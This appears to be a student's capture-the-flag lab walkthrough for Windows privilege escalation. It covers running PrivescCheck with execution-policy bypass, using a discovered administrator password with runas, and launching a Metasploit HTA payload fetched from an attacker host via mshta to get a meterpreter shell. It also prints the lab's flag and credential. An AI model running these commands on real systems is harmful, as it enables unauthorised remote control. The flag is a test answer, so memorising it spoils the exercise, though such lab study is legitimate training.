
***switch to victim machine***

Open the powershell.exe terminal to check the current user
We are running as a student user. We will run the PrivescCheck PowerShell script to find possible misconfiguration issues that can be leveraged for local privilege escalation.

- cd ``
```C:\Users\student\Desktop\PrivescCheck```
``
- ls
```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

We have found an administrator user credential. i.e administrator:hello_123321

We are running a command prompt i.e cmd.exe as an administrator user using
discovered credential and runas.exe

- runas.exe /user:administrator cmd
- enter pass: hello_123321

***Switch to the Kali Machine***

Step 6: Running the hta_server module to gain the meterpreter shell. Start msfconsole.
Commands:
msfconsole -q
use exploit/windows/misc/hta_server
exploit

```
“This module hosts an HTML Application (HTA) that when opened will run a payload via
Powershell..”
```
Copy the generated payload i.e “http://10.10.15.2:8080/jxEyD3w.hta” and run it on cmd.exe
with mshta command to gain the meterpreter shell.

Note: You need to execute the below payload on the cmd.exe.

***Switch to Victim Machine***

Step 7: Gaining a meterpreter shell.

Commands:
Note: You need to use your own Metasploit HTA server link

Payload: mshta.exe http://10.10.15.2:8080/jxEyD3w.hta

We can expect a meterpreter shell.

Step 8: Read the flag.
Commands:
sessions -i 1
cd C:\\Users\\Administrator\\Desktop
dir
cat flag.txt
This reveals the flag to us.
Flag: 2b070a650a92129c2462deae7707b0c5



another option
- msfconsole /script/webselivery
- run
- it will build us a payload that we can run in victim powershell command prompt
- copy n paste payload into victim machine
- then we will have a reverse shell in our msfconsole